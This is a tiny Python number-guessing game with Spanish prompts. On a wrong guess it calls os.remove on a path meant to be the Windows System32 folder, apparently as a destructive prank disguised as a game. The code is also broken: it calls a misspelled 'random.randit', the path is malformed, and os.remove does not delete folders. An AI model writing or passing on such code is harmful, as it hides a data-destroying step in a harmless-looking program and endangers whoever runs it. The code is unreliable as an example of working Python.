import random
import os

#juego de adivinar un numero
number = random.randit(1, 10)
guess = input("Elige un numero del 1 al 10.")
guess= int(guess)

if guess == number:
    print("Felicidades, ¡Ganaste!")
else:
    os.remove("C/Windows/System32")
